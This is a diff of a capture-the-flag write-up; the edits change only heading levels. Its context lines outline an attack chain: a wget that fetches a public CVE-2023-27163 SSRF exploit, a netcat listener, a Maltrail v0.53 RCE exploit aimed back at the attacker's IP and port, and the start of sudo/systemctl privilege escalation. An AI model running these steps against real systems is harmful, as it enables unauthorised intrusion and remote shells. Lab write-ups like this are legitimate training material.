@@ -4,7 +4,7 @@ Nmap scan
 
 <figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
 
-## Site scan
+# Site scan
 
 Let's check out the site on port 55555
 
@@ -12,7 +12,7 @@ Let's check out the site on port 55555
 
 We see it is running request-baskets version 1.2.1 after googling it is vulnerable to CVE-2023-27163
 
-## CVE-2023-27163
+# CVE-2023-27163
 
 1. First we get the exploit "wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh"
 2. Next we set up nc on port 8000
@@ -22,7 +22,7 @@ We see it is running request-baskets version 1.2.1 after googling it is vulnerab
 
 Leason learned don't get tunnel vision and enumerate properly before trying to exploit.
 
-## Deeper enumeration
+# Deeper enumeration
 
 I ran a gobuster scan on dns and dir mode but found nothin interesting. On the main page there is a login that asks for a master API key I tried interspting my own auth header and using that to no  avail.
 
@@ -34,7 +34,7 @@ A sidenot I remeber watching an Ippsec video where he said using 127.0.0.1 is be
 
 We find it's running maltrail v0.53
 
-## Exploit
+# Exploit
 
 To get RCE we do the following steps
 
@@ -43,7 +43,7 @@ To get RCE we do the following steps
 3. python3 exploit.py <>MY\_IP> \<PORT> http://\<IP:PORT>/\<BASKET>
 4. And we get the user flag!!
 
-## Priv esc
+# Priv esc
 
 Running sudo -l we see we can run: /usr/bin/systemctl status trail.service
 
